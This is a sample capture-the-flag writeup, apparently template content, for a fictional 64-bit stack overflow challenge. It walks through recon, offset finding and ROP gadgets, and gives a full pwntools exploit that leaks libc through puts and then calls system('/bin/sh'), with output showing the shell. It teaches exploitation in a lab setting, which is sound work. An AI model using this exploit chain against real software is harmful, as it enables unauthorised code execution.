[SAMPLE WRITEUP - replace with your own: content/writeups/examplectf-babyrop.md]

# ExampleCTF 2026 - babyrop

Category: pwn | Difficulty: easy | Date: 2026-09-14
Tools: pwntools, GDB + pwndbg, ROPgadget, checksec

This is a sample writeup for a fictional challenge, written to show the intended style. Replace it with your own.

## TL;DR

A classic 64-bit stack buffer overflow with NX enabled and no stack canary. We leak a libc address by calling puts@plt on puts@got, resolve the libc base from the leak, then return into the same binary a second time and build a ret2libc chain to pop a shell with system("/bin/sh").

Flag: flag{this_is_a_sample_writeup}

## Files

- babyrop (64-bit ELF, dynamically linked)
- libc.so.6 (provided by the organizers)

Always exploit against the exact libc the challenge ships. Offsets differ between versions, and a wrong libc means a wrong one_gadget and a wrong system offset.

## Recon

First, check the binary's mitigations:

```
$ checksec --file=./babyrop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

What this tells us:

- No canary: we can smash the saved return address directly.
- NX enabled: the stack is not executable, so no shellcode on the stack. We need ROP.
- No PIE: the binary loads at a fixed base (0x400000), so PLT/GOT addresses and gadgets inside the binary are at known, static addresses. Good news for building a chain.
- Partial RELRO: the GOT is writable, but we do not even need to overwrite it here.

Run it to see the behavior:

```
$ ./babyrop
what's your name?
AAAA
hi AAAA, got anything else to say?
BBBB
bye
```

Two reads. The second one is the overflow.

## Finding the overflow

Decompiled, the vulnerable function looks like:

```c
void vuln(void) {
    char buf[64];
    puts("what's your name?");
    read(0, buf, 0x20);
    printf("hi %s, got anything else to say?\n", buf);
    read(0, buf, 0x200);   // 0x200 bytes into a 64-byte buffer
    puts("bye");
}
```

The second read takes up to 0x200 (512) bytes into a 64-byte buffer. That is the bug.

### Finding the offset

Send a cyclic pattern and see what ends up in RIP:

```
$ cyclic 128 > pat
$ gdb ./babyrop
pwndbg> run < pat
...
pwndbg> # program crashes controlling RIP
pwndbg> cyclic -l $rsp
72
```

So the offset to the saved return address is 72 bytes: 64 bytes of buffer plus 8 bytes of saved RBP.

## Plan

NX rules out shellcode, so we do ret2libc. ASLR randomizes the libc base, so we need a leak first. Two stages:

1. Leak: call puts(puts@got). puts@got holds the runtime address of puts in libc, so printing it leaks a libc address. Then return into vuln for a second input.
2. Shell: with the libc base known, overflow again and call system("/bin/sh").

## Gadgets

We need a "pop rdi; ret" gadget to control the first argument (System V AMD64: first arg in RDI).

```
$ ROPgadget --binary ./babyrop | grep 'pop rdi'
0x0000000000401263 : pop rdi ; ret
```

We also need the PLT/GOT entries and a symbol to return to. From the ELF (no PIE, so these are final addresses):

```
puts@plt  = 0x401050
puts@got  = 0x404018
vuln      = 0x401176
```

A bare "ret" gadget is handy for stack alignment before calling into libc (movaps on modern glibc faults if RSP is not 16-byte aligned):

```
0x000000000040101a : ret
```

## Stage 1: leak libc

Chain layout for the first overflow:

```
[ 72 bytes padding ]
[ pop rdi ; ret    ]
[ puts@got         ]   -> rdi = address of puts@got
[ puts@plt         ]   -> call puts(puts@got), leaks libc puts
[ vuln             ]   -> return here for a second round
```

Read the 8-byte leak back, strip the trailing newline, and compute the libc base:

```
libc_base = leaked_puts - libc.symbols['puts']
```

## Stage 2: ret2libc

With the base known, resolve system and the "/bin/sh" string:

```
system   = libc_base + libc.symbols['system']
binsh    = libc_base + next(libc.search(b'/bin/sh\x00'))
```

Second overflow:

```
[ 72 bytes padding ]
[ ret              ]   -> 16-byte stack alignment
[ pop rdi ; ret    ]
[ binsh            ]   -> rdi = "/bin/sh"
[ system           ]   -> system("/bin/sh")
```

## Full exploit

```python
#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF('./babyrop', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# Toggle local vs remote with: python3 exploit.py REMOTE HOST PORT
if args.REMOTE:
    io = remote(sys.argv[2], int(sys.argv[3]))
else:
    io = process(exe.path)

OFFSET   = 72
pop_rdi  = 0x401263
ret      = 0x40101a

# ---- Stage 1: leak puts@got via puts@plt, then return to vuln ----
payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['vuln'])

io.recvuntil(b'anything else to say?\n')
io.send(payload)

io.recvuntil(b'bye\n')
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
log.success('puts @ %#x' % leak)

libc.address = leak - libc.symbols['puts']
log.success('libc base @ %#x' % libc.address)

# ---- Stage 2: ret2libc -> system("/bin/sh") ----
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh\x00'))

payload  = b'A' * OFFSET
payload += p64(ret)          # align the stack for movaps in system
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

# The first read of the next round is the 0x20 "name" read; we need
# to reach the 0x200 overflow read, so consume the prompt first.
io.recvuntil(b"what's your name?\n")
io.send(b'go\n')
io.recvuntil(b'anything else to say?\n')
io.send(payload)

io.interactive()
```

Running it:

```
$ python3 exploit.py REMOTE ctf.example.net 31337
[+] puts @ 0x7f3c1a0c3aa0
[+] libc base @ 0x7f3c1a040000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
flag{this_is_a_sample_writeup}
```

## Gotchas

- Stack alignment: modern glibc uses movaps inside system, which faults if RSP is not 16-byte aligned at the call. If stage 2 crashes instead of popping a shell, add (or remove) one extra ret gadget before pop rdi.
- Wrong libc: if the leak looks sane but system never fires, you are almost certainly using the wrong libc. Confirm with the provided libc, not your system's.

## Lessons learned

- No canary plus NX is the textbook setup for ret2libc. Recognize it from checksec alone.
- A single call to puts(puts@got) defeats ASLR when you can loop back for a second input.
- Build the leak and the shell as two clean stages. It is easier to debug than one giant chain.
